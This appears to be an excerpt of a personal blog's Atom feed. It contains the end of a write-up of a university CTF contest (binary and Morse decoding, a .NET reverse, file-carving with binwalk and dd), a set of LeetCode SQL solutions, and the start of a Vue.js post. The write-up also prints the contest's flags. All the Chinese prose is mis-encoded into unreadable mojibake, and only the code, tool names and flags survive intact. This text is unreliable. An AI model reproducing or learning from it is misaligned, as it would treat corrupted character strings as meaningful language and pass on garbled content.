<p><img src="/pics/nuaactf/rev2.png" alt="Rev 2"></p>
<p>ç„¶åä¸€ç‚¹ä¸€ç‚¹æ•° 01 æ•°å‡ºæ¥ï¼Œå¾—åˆ°ï¼š</p>
<blockquote>
<p>01101110
01110101
01100001
01100001
01100011
01110100
01100110
01111011
01110011
01101000
00110000
01110010
01110100
01011111
01100110
00110001
01000001
01100111</p>
</blockquote>
<p>æ•°æ ¼å­æ•°çš„çœ¼éƒ½è¦èŠ±äº†â€¦<br>
æ¯ä¸€è¡Œ 8 ä½äºŒè¿›åˆ¶è½¬ ASCII ç ï¼Œå¾—åˆ° flag <code>nuaactf{sh0rt_f1Ag</code>, å°‘äº†ä¸€ä¸ªå³æ‹¬å·ğŸ˜‚<br>
çœŸæ˜¯å¹¸äº flag çŸ­â€¦</p>
<p>é¡ºä¾¿è¯´ä¸€å¥ï¼Œé‚£ä¸ªéŸ³é¢‘çœŸå¥½å¬ï¼Œå¬è¯´æ˜¯é”¤å­æ‰‹æœºçš„é»˜è®¤é“ƒå£°ğŸ˜³</p>
<h1 id="rev-3">Rev 3</h1>
<p><strong>ä¸å–œæ¬¢å†™ç•Œé¢çš„ç™½èœå“¥</strong></p>
<p><code>.NET</code> é€†å‘ï¼Œç›´æ¥æ‹–åˆ° IDA é‡Œé¢ï¼Œä¸€é˜µä¹±ç¿»ï¼Œç¿»åˆ°äº†ä¸‰æ®µ base64 å’Œä¸€ä¸ªæ‘©å°”æ–¯ç”µç è¡¨ã€‚æŠŠä¸‰æ®µ base64 æ‹¼èµ·æ¥ä»¥å decode, å¾—åˆ°ä¸€æ®µæ‘©å°”æ–¯ç”µç  <code>-. ..- .- .- -.-. - ..-. 2D3f ... .- .--. .--. -.-- -.-. .-. .- -.-. -....- .---- -. --. -.-. ... ... .- .-. .--. -...--.-</code> (2D3f æ˜¯ä»€ä¹ˆé¬¼ğŸ˜‚)ï¼Œè§£ç åå¾—åˆ° flag <code>NUAACTF{SAPPYCRACK1NGCSSARP}</code>ï¼Œæ”¾åˆ°æºç¨‹åºé‡Œé¢ï¼Œæ˜¾ç¤º flag æ­£ç¡®ã€‚</p>
<p>ç„¶åï¼Œæäº¤ä»¥åè¯´ flag ä¸å¯¹ï¼<br>
ä¸ºä»€ä¹ˆ flag ä¸æ˜¯ Happy Cracking CSharp? çœ‹äº†åŠå¤©ï¼Œåˆäº¤äº†åŠå¤©çš„ flagï¼Œæ²¡æ‰¾å‡ºé—®é¢˜ã€‚åæ¥å‘ç°ç¨‹åºç¼–ç è¡¨é‡Œé¢ H å’Œ S çš„ç¼–ç ä¸€æ ·ğŸ˜‚ æ‰€ä»¥é‡Œé¢æ‰€æœ‰çš„ S æ¢æˆ Hï¼Œæºç¨‹åºéƒ½ä¼šæç¤º flag æ­£ç¡®â€¦<br>
æŠŠ H å’Œ S è½¬æ¢ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•ï¼Œæœ€åè¯•å‡ºæ¥ flag æ˜¯ <code>NUAACTF{HAPPYCRACK1NGCHHARP}</code>ï¼Œä¹Ÿæ˜¯é†‰äººã€‚</p>
<h1 id="pwn-1">Pwn 1</h1>
<p><strong>ä¹±ç ï¼ä¹±ç ï¼</strong></p>
<p>ç­¾åˆ°é¢˜ã€‚ä¸‹è½½ä¸‹æ¥ä¸€ä¸ª txtï¼Œæ‰“å¼€ä»¥åå‘ç°æ˜¯ jsfuckï¼Œæ”¾åˆ°æµè§ˆå™¨é‡Œè¿è¡Œå¾—åˆ° flag.</p>
<h1 id="pwn-2">Pwn 2 ï¼ˆæœªè§£å‡ºï¼‰</h1>
<p><strong>å›å®¶çš„è·¯</strong></p>
<p>CTF ç«èµ›è€ƒäº†ç®—æ³•â€¦æœ€çŸ­è·¯â€¦çœŸæ˜¯é†‰é†‰å“’ã€‚<br>
ä¸€å¼€å§‹æ²¡æœ‰ç»†æƒ³ï¼Œçå†™äº†ä¸€ä¸ªæ·±åº¦ä¼˜å…ˆæœç´¢ï¼Œå‡ºæ¥å¥½å¤šè§£ï¼Œç„¶è€Œæ²¡æœ‰ä¸€ä¸ªæ˜¯å¯¹çš„ï¼Œä¹Ÿæ˜¯æ‚²å‚¬ã€‚<br>
åˆ°æœ€åä¹Ÿæ²¡æœ‰åšã€‚</p>
<h1 id="misc-1">Misc 1</h1>
<p><strong>å¥‡æ€ªçš„å‹ç¼©åŒ…</strong></p>
<p>å˜›ï¼Œéšå†™çš„é¢˜éƒ½è›®å¥½ç©å“’ğŸ˜œ</p>
<p><a href="/pics/nuaactf/misc1.rar">misc1.rar</a> ä¸‹è½½ä¸‹æ¥åæ— æ³•æ‰“å¼€ï¼Œ<code>file</code> ä¸€ä¸‹å‘ç°æ˜¯ä¸ª PNGï¼Œæ”¹æ‹“å±•ååæ‰“å¼€ï¼Œå¾—åˆ° flagã€‚è¿™ä¸ªä¹Ÿç®—ç­¾åˆ°é¢˜å§ã€‚</p>
<h1 id="misc-2">Misc 2</h1>
<p><strong>å¥‡æ€ªçš„å›¾ç‰‡</strong></p>
<p><img src="/pics/nuaactf/misc2.png" alt="misc2.png"></p>
<p>ä¸‹è½½ <code>misc2.png</code>, <code>pngcheck</code> æç¤º <code>additional data after IEND chunk</code>, çœ‹æ¥æœ€åä¸€å—åé¢è¿˜æœ‰ä¸œè¥¿ï¼Œç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œå‘ç°æ–‡ä»¶æœ€åç”¨æ˜æ–‡å†™ç€ key.</p>
<p>åˆšåˆšåœ¨æ–‡ä»¶æœ«å°¾å‘ç°äº†ä¸€ä¸ªæ–‡ä»¶å¤´ <code>PK\x03\x04</code>, è§‰å¾—åº”è¯¥æ˜¯ä¸ª zip æ–‡ä»¶ï¼Œ<code>binwalk</code> ä¸€ä¸‹ç„¶åç”¨ <code>dd</code> åˆ†å¼€ï¼Œå¾—åˆ°ä¸€ä¸ª zip æ–‡ä»¶ï¼Œè§£å‹åå¾—åˆ° flag. è¿™åº”è¯¥æ˜¯è¿™ä¸ªé¢˜çš„æ ‡å‡†åšæ³•å§ï¼Œåªæ˜¯ä¸ºä»€ä¹ˆåš zip æ–‡ä»¶çš„æ—¶å€™æ²¡æœ‰å‹ç¼©ğŸŒš</p>
<h1 id="misc-3">Misc 3</h1>
<p><strong>æ›´å¥‡æ€ªçš„å›¾ç‰‡</strong>ï¼ˆä½ ä»¬è¿™èµ·çš„éƒ½æ˜¯ä»€ä¹ˆåå­—ï¼‰</p>
<p><img src="/pics/nuaactf/misc3.png" alt="misc3.png"></p>
<p>ä¸‹è½½ä¸‹æ¥ï¼ˆå¬è¯´è¿™æ˜¯èˆ°å¨˜ï¼Ÿï¼‰ï¼Œ<code>pngcheck</code> æ²¡æœ‰é”™è¯¯ï¼Œå¡äº†ä¸€ä¼šã€‚åæ¥ç”¨ PS æ‰“å¼€ï¼ŒæŠŠè‰²é˜¶æ‹‰ä½ï¼Œå‘ç°å›¾çš„å·¦ä¸‹è§’æœ‰ä¸ªäºŒç»´ç ï¼Œæ‰«ç å¾— <code>QlpoOTFBWSZTWXhAk1kAAAtfgAAQIABgAAgAAACvIbYKIAAigNHqNGmnqFMJpoDTEO0CXcIvl9SeOAB3axLQYn4u5IpwoSDwgSay</code>.<br>
è§£ç åå‘ç°æ˜¯ä¹±ç ï¼Œä¸çŸ¥é“æ€ä¹ˆåšäº†ï¼Œå¡äº†å¾ˆä¹…ğŸ˜· æ¯”èµ›çš„æœ€åä¸€ä¸ªå°æ—¶çœ‹è§äº†è§£ç åå­—ç¬¦ä¸²å¼€å¤´çš„ BZï¼Œçªç„¶æ„è¯†åˆ°è¿™å¯èƒ½æ˜¯ä¸ªæ–‡ä»¶å¤´ï¼Œäºæ˜¯å°†è§£ç åçš„å†…å®¹å†™å…¥æ–‡ä»¶ï¼Œ<code>file</code> ä¸€ä¸‹å‘ç°æœç„¶æ˜¯ä¸ª <code>bz</code> å‹ç¼©æ–‡ä»¶ï¼Œè§£å‹åå¾—åˆ° flag.</p>
<h1 id="misc-4">Misc 4 ï¼ˆæœªè§£å‡ºï¼‰</h1>
<p><strong>è®¨åŒçš„ APP</strong></p>
<p>è§…åŠ¨æ ¡å›­ä»€ä¹ˆé¬¼ï¼Ÿï¼</p>
<h1 id="">æ€»ç»“</h1>
<p>æ¯”èµ›äº”ä¸ªå°æ—¶ï¼Œè§£äº† 10 é“é¢˜ï¼Œå‰åŠå°æ—¶è§£å‡ºæ¥ 5 é“ï¼Œåé¢å„ç§å¡ï¼Œæœ€åä¸€ä¸ªå°æ—¶è„‘æ´å¤§å¼€åˆè§£å‡ºæ¥ 3 é“é¢˜ğŸ˜‚
CTF çœŸå¥½ç©ï¼Œè€ƒåˆ°äº†å„ç§å§¿åŠ¿å„ç§è„‘æ´ï¼Œè¿˜æ˜¯è›®æœ‰æ„æ€å“’~<br>
ç„¶è€Œäº”ä¸ªå°æ—¶çš„æ¯”èµ›çœŸçš„å¤ªç´¯äº†â€¦è¡€çš„æ•™è®­ï¼Œä¸‹æ¬¡é¢˜ç›®åšä¸å‡ºæ¥è¿˜æ˜¯è¦è·‘å‡ºå»æ­‡ä¸€ä¼šå†å›æ¥åš_(:Ğ·ã‚âˆ )_</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å­¦æ ¡ç»„ç»‡äº†ç¬¬ä¸€å±Š NUAACTFï¼Œå‚åŠ å»ç©ç©ï¼Œå¼€å¼€è„‘æ´ğŸ˜‚ï¼Œå—¯ï¼Œè¿˜è›®å¥½ç©çš„~&lt;/p&gt;
    
    </summary>
    
      <category term="ä¹±ä¸ƒå…«ç³Ÿ" scheme="//blog.stdioa.com/categories/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/"/>
    
    
      <category term="CTF" scheme="//blog.stdioa.com/tags/CTF/"/>
    
      <category term="è„‘æ´" scheme="//blog.stdioa.com/tags/%E8%84%91%E6%B4%9E/"/>
    
      <category term="Python" scheme="//blog.stdioa.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode æ•°æ®åº“é¢˜ç›®è§£ç­”</title>
    <link href="//blog.stdioa.com/2016/04/leetcode-database-solutions/"/>
    <id>//blog.stdioa.com/2016/04/leetcode-database-solutions/</id>
    <published>2016-04-06T08:02:00.000Z</published>
    <updated>2016-11-08T13:48:35.544Z</updated>
    
    <content type="html"><![CDATA[<p>å‰ä¸¤å¤©é‡åˆ·äº†ã€ŠSQLå¿…çŸ¥å¿…ä¼šã€‹ï¼Œæ˜¨å¤©æƒ³åˆ°äº† LeetCodeï¼Œäºæ˜¯å»åˆ·äº†å‡ é“æ•°æ®åº“çš„é¢˜ç›®ï¼Œå¼€äº†ä¸å°‘è„‘æ´ã€‚</p>
<a id="more"></a>
<p>ä»Šå¤©æŠŠç­”æ¡ˆæ•´ç†ä¸€ä¸‹ã€‚å–”ï¼Œé¢˜åº“åœ¨<a href="https://leetcode.com/problemset/database/" target="_blank" rel="external">è¿™é‡Œ</a>ã€‚</p>
<h1 id="175-combine-two-tables"><a href="https://leetcode.com/problems/combine-two-tables/" target="_blank" rel="external">175. Combine Two Tables</a></h1>
<p>æ ·ä¾‹ä¸­æœ‰äº›äººçš„ <code>PersonId</code> æ— æ³•åœ¨ <code>Address</code> è¡¨ä¸­æ‰¾åˆ°ï¼Œæ‰€ä»¥ä½¿ç”¨ <code>LEFT JOIN</code>.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> FirstName, LastName, City, State</div><div class="line"><span class="keyword">FROM</span> Person</div><div class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> Address</div><div class="line"><span class="keyword">ON</span> Person.PersonId = Address.PersonId;</div></pre></td></tr></table></figure>
<h1 id="176-second-highest-salary"><a href="https://leetcode.com/problems/second-highest-salary/" target="_blank" rel="external">176. Second Highest Salary</a></h1>
<p><code>UNION</code> æŸ¥è¯¢ï¼Œåœ¨ç»“æœçš„æœ€åæ·»åŠ ä¸€ä¸ª <code>NULL</code>, è‹¥ä¸å­˜åœ¨ç¬¬äºŒé«˜çš„è–ªæ°´åˆ™ä¼šé€‰æ‹© <code>NULL</code>.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> Salary <span class="keyword">FROM</span> Employee</div><div class="line"><span class="keyword">UNION</span></div><div class="line"><span class="keyword">SELECT</span> <span class="literal">NULL</span></div><div class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> Salary <span class="keyword">DESC</span></div><div class="line"><span class="keyword">LIMIT</span> <span class="number">1</span>, <span class="number">1</span>;</div></pre></td></tr></table></figure>
<h1 id="177-nth-highest-salary"><a href="https://leetcode.com/problems/nth-highest-salary/" target="_blank" rel="external">177. Nth Highest Salary</a></h1>
<p>è¿™ä¸ªä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸å¯ä»¥ç”¨ <code>LIMIT 1, N-1</code>ï¼Œæ‰€ä»¥ç”¨äº† <code>IF</code> å‡½æ•°ã€‚</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> getNthHighestSalary(N <span class="built_in">INT</span>) <span class="keyword">RETURNS</span> <span class="built_in">INT</span></div><div class="line"><span class="keyword">BEGIN</span></div><div class="line">  <span class="keyword">RETURN</span> (</div><div class="line">      # Write your MySQL <span class="keyword">query</span> <span class="keyword">statement</span> below</div><div class="line">      <span class="keyword">SELECT</span> <span class="keyword">IF</span>(<span class="keyword">COUNT</span>(*) &gt;= N, <span class="keyword">MIN</span>(rank.Salary), <span class="literal">NULL</span>)</div><div class="line">      <span class="keyword">FROM</span> (</div><div class="line">        <span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> Salary</div><div class="line">        <span class="keyword">FROM</span> Employee</div><div class="line">        <span class="keyword">ORDER</span> <span class="keyword">BY</span> Salary <span class="keyword">DESC</span></div><div class="line">        <span class="keyword">LIMIT</span> N</div><div class="line">    ) <span class="keyword">AS</span> <span class="keyword">rank</span></div><div class="line">  );</div><div class="line"><span class="keyword">END</span></div></pre></td></tr></table></figure>
<h1 id="178-rank-scores"><a href="https://leetcode.com/problems/rank-scores/" target="_blank" rel="external">178. Rank Scores</a></h1>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> Score, (</div><div class="line">    <span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(<span class="keyword">DISTINCT</span> Score)</div><div class="line">    <span class="keyword">FROM</span> Scores <span class="keyword">AS</span> c</div><div class="line">    <span class="keyword">WHERE</span> o.Score &lt;= c.Score      # ç»Ÿè®¡æ¯”å·²é€‰åˆ†æ•°å°çš„åˆ†æ•°ä¸ªæ•°</div><div class="line">) <span class="keyword">AS</span> <span class="keyword">Rank</span></div><div class="line"><span class="keyword">FROM</span> Scores <span class="keyword">AS</span> o</div><div class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> Score <span class="keyword">DESC</span>;</div></pre></td></tr></table></figure>
<h1 id="180-consecutive-numbers"><a href="https://leetcode.com/problems/consecutive-numbers/" target="_blank" rel="external">180. Consecutive Numbers</a></h1>
<p>æš´åŠ›æŸ¥è¯¢ğŸ˜‚</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> l1.Num <span class="keyword">AS</span> ConsecutiveNums</div><div class="line"><span class="keyword">FROM</span> <span class="keyword">Logs</span> <span class="keyword">AS</span> l1, <span class="keyword">Logs</span> <span class="keyword">AS</span> l2, <span class="keyword">Logs</span> <span class="keyword">AS</span> l3</div><div class="line"><span class="keyword">WHERE</span> l1.Id+<span class="number">1</span> = l2.Id <span class="keyword">AND</span> l2.Id+<span class="number">1</span> = l3.Id</div><div class="line">  <span class="keyword">AND</span> l1.Num = l2.Num <span class="keyword">AND</span> l2.Num = l3.Num;</div></pre></td></tr></table></figure>
<h1 id="181-employees-earning-more-than-their-managers"><a href="https://leetcode.com/problems/employees-earning-more-than-their-managers/" target="_blank" rel="external">181. Employees Earning More Than Their Managers</a></h1>
<p>é€‰æ‹©é›‡å‘˜ï¼Œæ ¹æ® <code>ManagerId</code> æ‰¾åˆ°é›‡å‘˜ä¸Šå¸çš„è–ªæ°´ï¼Œç„¶åè¿›è¡Œæ¯”è¾ƒå³å¯ã€‚</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">Name</span></div><div class="line"><span class="keyword">FROM</span> Employee</div><div class="line"><span class="keyword">WHERE</span> Salary &gt; (</div><div class="line">          <span class="keyword">SELECT</span> Salary</div><div class="line">          <span class="keyword">FROM</span> Employee <span class="keyword">AS</span> e</div><div class="line">          <span class="keyword">WHERE</span> e.id = Employee.ManagerId</div><div class="line">        );</div></pre></td></tr></table></figure>
<h1 id="182-duplicate-emails"><a href="https://leetcode.com/problems/duplicate-emails/" target="_blank" rel="external">182. Duplicate Emails</a></h1>
<p>æŒ‰ <code>Email</code> å­—æ®µè¿›è¡Œåˆ†ç±»ï¼Œä½¿ç”¨ <code>HAVING</code> ç­›é€‰å‡ºç›¸åŒ <code>Email</code> æ•°é‡å¤§äº 1 çš„é¡¹ã€‚</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> Email <span class="keyword">FROM</span> Person</div><div class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> Email</div><div class="line"><span class="keyword">HAVING</span> <span class="keyword">COUNT</span>(Email)&gt;<span class="number">1</span>;</div></pre></td></tr></table></figure>
<h1 id="183-customers-who-never-order"><a href="https://leetcode.com/problems/customers-who-never-order/" target="_blank" rel="external">183. Customers Who Never Order</a></h1>
<p>è¿™ä¸ªä¹Ÿæ˜¯ç›´æ¥æŸ¥è¯¢â€¦</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> c.Name <span class="keyword">AS</span> Customers</div><div class="line"><span class="keyword">FROM</span> Customers <span class="keyword">AS</span> c</div><div class="line"><span class="keyword">WHERE</span> (<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*)</div><div class="line">       <span class="keyword">FROM</span> Orders</div><div class="line">       <span class="keyword">WHERE</span> c.id = Orders.CustomerId) = <span class="number">0</span>;</div></pre></td></tr></table></figure>
<h1 id="184-department-highest-salary"><a href="https://leetcode.com/problems/department-highest-salary/" target="_blank" rel="external">184. Department Highest Salary</a></h1>
<p>åŸºæœ¬ä¸Šå°±æ˜¯ç›´æ¥æŸ¥è¯¢ï¼Œæ³¨æ„ <code>WHERE</code> è¯­å¥ä¸­åˆ¤åˆ«æ¡ä»¶çš„ä½ç½®ï¼Œå¦åˆ™æœ‰å¯èƒ½ TLEğŸ˜‚</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> d.Name <span class="keyword">AS</span> Department,</div><div class="line">    e.Name <span class="keyword">AS</span> Employee,</div><div class="line">    e.Salary</div><div class="line"><span class="keyword">FROM</span> Employee <span class="keyword">AS</span> e, Department <span class="keyword">AS</span> d</div><div class="line"><span class="keyword">WHERE</span> e.DepartmentId = d.Id</div><div class="line">  <span class="keyword">AND</span> e.Salary = (<span class="keyword">SELECT</span> <span class="keyword">MAX</span>(e2.Salary)</div><div class="line">                <span class="keyword">FROM</span> Employee <span class="keyword">AS</span> e2</div><div class="line">                <span class="keyword">WHERE</span> e.DepartmentId = e2.DepartmentId);</div></pre></td></tr></table></figure>
<h1 id="185-department-top-three-salaries"><a href="https://leetcode.com/problems/department-top-three-salaries/" target="_blank" rel="external">185. Department Top Three Salaries</a></h1>
<p>è¾“å‡ºæ¯ä¸ªéƒ¨é—¨è–ªèµ„æœ€é«˜çš„ä¸‰ä¸ªäººã€‚è¿™ä¸ªé¢˜é‡Œæœ‰ä¸ªå‘ï¼Œå¦‚æœä¸¤ä¸ªäººè–ªèµ„ç›¸åŒï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªäººå¹¶åˆ—ï¼Œéƒ½è¦è¾“å‡ºã€‚å¹¶ä¸”å¦‚æœå››ä¸ªäººçš„è–ªèµ„ä¸º 3 2 2 1ï¼Œ è–ªèµ„ä¸º 1 çš„é‚£ä¸ªäººæ’ç¬¬ 3 ğŸ˜‚</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> d.Name <span class="keyword">AS</span> Department,</div><div class="line">    e.Name <span class="keyword">AS</span> Employee,</div><div class="line">    e.Salary</div><div class="line"><span class="keyword">FROM</span> Employee <span class="keyword">AS</span> e, Department <span class="keyword">AS</span> d</div><div class="line"><span class="keyword">WHERE</span> e.DepartmentId = d.Id</div><div class="line">  <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(<span class="keyword">DISTINCT</span> e2.Salary)             # æ’åºæ—¶å…è®¸å¹¶åˆ—</div><div class="line">            <span class="keyword">FROM</span> Employee <span class="keyword">AS</span> e2</div><div class="line">            <span class="keyword">WHERE</span> e.DepartmentId = e2.DepartmentId</div><div class="line">              <span class="keyword">AND</span> e.Salary &lt; e2.Salary) &lt; <span class="number">3</span>         # æ¯”è¯¥é›‡å‘˜å·¥èµ„é«˜çš„äººå°‘äºä¸‰ä¸ª</div><div class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> Department, Salary <span class="keyword">DESC</span>;</div></pre></td></tr></table></figure>
<h1 id="196-delete-duplicate-emails"><a href="https://leetcode.com/problems/delete-duplicate-emails/" target="_blank" rel="external">196. Delete Duplicate Emails</a></h1>
<p>MySQL ä¸å…è®¸åœ¨åˆ é™¤æ—¶ä¾æ®å¾…åˆ é™¤çš„è¡¨è¿›è¡Œç­›é€‰ (You canâ€™t specify target tableâ€™Personâ€™ for update in FROM clause), æ‰€ä»¥è¦ç»•ä¸€ä¸‹ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"># é”™çš„ï¼ï¼</div><div class="line">DELETE FROM Person</div><div class="line">WHERE Id IN (SELECT p2.Id</div><div class="line">             FROM Person AS p1, Person AS p2</div><div class="line">             WHERE p1.Email = p2.Email</div><div class="line">               AND p1.Id &lt; p2.Id</div><div class="line">            );</div><div class="line"></div><div class="line">DELETE FROM Person</div><div class="line">WHERE Id IN (SELECT * FROM(                         # ç»•ä¸€ä¸‹ï¼Œå…ˆæŒ‘å‡ºæ‰€æœ‰æ»¡è¶³è¦æ±‚çš„ ID æ„æˆä¸€ä¸ªè¡¨ï¼Œå†ä»è¿™ä¸ªè¡¨ä¸­é€‰ Id è¿›è¡Œåˆ é™¤</div><div class="line">                    SELECT p2.Id</div><div class="line">                    FROM Person AS p1, Person AS p2</div><div class="line">                    WHERE p1.Email = p2.Email</div><div class="line">                      AND p1.Id &lt; p2.Id) AS temp</div><div class="line">                      );</div></pre></td></tr></table></figure>
<h1 id="197-rising-temperature"><a href="https://leetcode.com/problems/rising-temperature/" target="_blank" rel="external">197. Rising Temperature</a></h1>
<p>ä¸»è¦è€ƒ <code>MySQL</code> çš„æ—¥æœŸæ“ä½œå‡½æ•°ã€‚</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> w1.Id <span class="keyword">AS</span> <span class="keyword">Id</span></div><div class="line"><span class="keyword">FROM</span> Weather <span class="keyword">AS</span> w1, Weather <span class="keyword">AS</span> w2</div><div class="line"><span class="keyword">WHERE</span> <span class="keyword">datediff</span>(w1.Date, w2.Date) = <span class="number">1</span></div><div class="line">  <span class="keyword">AND</span> w1.Temperature &gt; w2.Temperature;</div></pre></td></tr></table></figure>
<h1 id="262-trips-and-users"><a href="https://leetcode.com/problems/trips-and-users/" target="_blank" rel="external">262. Trips and Users</a></h1>
<p>å¤ªä¹±äº†ï¼Œæ²¡åšğŸ˜¥</p>
<h1 id="">åè®°</h1>
<p>æ˜¨å¤©èŠ±äº†åŠå¤©å†™å®Œè¿™äº›é¢˜ï¼Œå†™åˆ°æœ€åéƒ½ä¸çŸ¥é“è‡ªå·±åœ¨å†™ä»€ä¹ˆäº†ğŸ˜‚ä¸è¿‡è¿˜æ˜¯æŒæ¡äº†ä¸å°‘çš„ SQL æŸ¥è¯¢æŠ€å·§ï¼Œæ¯”å¦‚ <code>UNION SELECT NULL</code> ç­‰ç­‰ã€‚</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å‰ä¸¤å¤©é‡åˆ·äº†ã€ŠSQLå¿…çŸ¥å¿…ä¼šã€‹ï¼Œæ˜¨å¤©æƒ³åˆ°äº† LeetCodeï¼Œäºæ˜¯å»åˆ·äº†å‡ é“æ•°æ®åº“çš„é¢˜ç›®ï¼Œå¼€äº†ä¸å°‘è„‘æ´ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="LeetCode" scheme="//blog.stdioa.com/categories/LeetCode/"/>
    
    
      <category term="LeetCode" scheme="//blog.stdioa.com/tags/LeetCode/"/>
    
      <category term="æ•°æ®åº“" scheme="//blog.stdioa.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
      <category term="SQL" scheme="//blog.stdioa.com/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>éšæ‰‹è®°ä¹‹Vue.js</title>
    <link href="//blog.stdioa.com/2016/03/essay-vue/"/>
    <id>//blog.stdioa.com/2016/03/essay-vue/</id>
    <published>2016-03-28T13:40:03.000Z</published>
    <updated>2016-11-08T13:48:35.501Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰çš„é‚£é—¨ JS å’Œå‰ç«¯è¯¾ç»“è¯¾äº†ï¼Œæœ€åèŠ±äº†ä¸€å‘¨æ—¶é—´å†™äº†ä¸€ä¸ª projectï¼Œä½¿ç”¨ Vue.js çš„ä¸€å¥—å·¥å…·å†™äº†ä¸€ä¸ªå•é¡µé¢åº”ç”¨ï¼Œå…ˆå°†ä½¿ç”¨åˆ°åŠå­¦åˆ°çš„çŸ¥è¯†æ¥æ•´ç†ä¸€ä¸‹ã€‚</p>
<a id="more"></a>
<p>æƒ³äº†æƒ³ï¼Œä¹‹å‰è‡ªå·±å­¦ä¹  <code>Vue.js</code> çš„æ—¶å€™ä¸€ç›´åœ¨ç¿»æ–‡æ¡£ï¼Œç¿»åˆ°å“ªäº›è®©äººçœ¼å‰ä¸€äº®çš„åŠŸèƒ½æ—¶å°±å°†å®ƒåŠ è¿›è‡ªå·±çš„é¡¹ç›®é‡Œï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆç³»ç»Ÿåœ°è¿›è¡Œå­¦ä¹ ï¼Œæ‰€ä»¥æƒ³åˆ°å“ªå†™åˆ°å“ªå¥½äº†ã€‚å‰æ–¹é«˜ä¹±é¢„è­¦ã€‚</p>
<h1 id="1-vuejs">1. Vue.js</h1>
<p>ä¹‹å‰ç”¨ <code>React</code> ç”¨å¾—æœ‰äº›ä¸çˆ½äº†æ‰€ä»¥æƒ³æ¢æ¢å£å‘³, äºæ˜¯ ç”¨<a href="http://vuejs.org.cn/" target="_blank" rel="external"><code>Vue.js</code></a> å†™äº†ä¸€ä¸ªå°åº”ç”¨çš„å‰ç«¯éƒ¨åˆ†ã€‚å®ƒçš„è½»é‡ä»¥åŠMVVMæ¶æ„è®©æˆ‘åœ¨ä¸¤å¤©ä¹‹å†…çˆ±ä¸Šäº†å®ƒï¼Œäºæ˜¯å†³å®šç”¨å®ƒä»£æ›¿ React å»å®Œæˆ final project çš„å‰ç«¯éƒ¨åˆ†ã€‚</p>
